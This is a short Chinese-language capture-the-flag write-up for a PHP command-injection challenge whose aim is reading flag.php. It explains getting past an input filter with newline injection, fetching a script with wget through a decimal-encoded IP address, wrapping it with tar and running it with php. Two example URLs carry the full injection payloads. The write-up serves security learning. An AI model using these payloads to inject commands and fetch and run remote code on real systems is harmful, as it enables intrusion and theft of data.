### writeUp 

这是在绿盟实习,xfkxfk讲过的一个原题 @zer0yu

---------------------
从源码可以看出index.php可以执行纯字母数字的linux命令，目标是去读flag.php文件中的flag.
1. 利用换行可绕过正则表达式执行命令。
2. 通过生成ip地址长整数绕过正则表达式，下载exploit脚本。
3. 通过tar命令将有后缀脚本打包，为无后缀文文件,再用php命令执行

-------- 

次题目的主要矛盾就是,我们没有办法输入特殊字符,所以没有办法指定参数 
wget可以识别16进制,10进制,8进制的文件,所以可以wget下载文件.
但是wget下载之后,默认文件名是index.html  有特殊字符点,我们还是没有办法执行,
所以想到tar 命令,将文件打包为无后缀文件,但是不压缩,所以原来文件中的字符串原样放到压缩档里面去,
然后就可以用php来执行php文件了.


Example:
```
http://localhost/canYouSeeMe?args[]=whatever%0a&args[]=mkdir&args[]=test%0a&args[]=cd&args[]=test%0a&args[]=wget&args[]=2130706433
http://localhost/canYouSeeMe?args[]=whatever%0a&args[]=tar&args[]=cvf&args[]=exploit&args[]=test%0a&args[]=php&args[]=exploit
```